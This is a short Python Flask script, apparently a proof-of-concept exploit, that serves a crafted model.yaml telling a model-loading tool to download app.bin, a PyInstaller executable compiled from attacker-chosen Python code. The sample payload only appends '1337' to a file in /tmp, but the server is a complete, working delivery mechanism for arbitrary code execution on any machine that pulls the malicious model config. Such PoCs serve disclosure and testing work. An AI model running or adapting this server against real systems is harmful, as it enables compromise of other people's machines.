from flask import Flask,send_file,request
import tempfile
import PyInstaller.__main__
import os

app=Flask(__name__)

CONF="""name: "life"

download_files:
  - filename: "app.bin"
    uri: "{0}app.bin"
"""

# Builds exploit code
def build():
    CODE = 'open("/tmp/test.txt","a").write("1337")' # Python code we want to run
    appname="app.bin"
    if os.path.isfile(appname):
        return appname
    with tempfile.NamedTemporaryFile(delete=False) as fp:
        fp.write(CODE.encode())
        fp.close()
        PyInstaller.__main__.run(["--onefile","--clean","--workpath","/tmp/build/","--specpath","/tmp","--distpath",".","-n",appname,fp.name])
    return appname

# Serve model.yaml file
@app.get("/model.yaml")
def model():
    return CONF.format(request.root_url)

# Serve app.bin file
@app.get("/app.bin")
def files():
    return send_file(build())

# Start the server
app.run("0.0.0.0",8000)
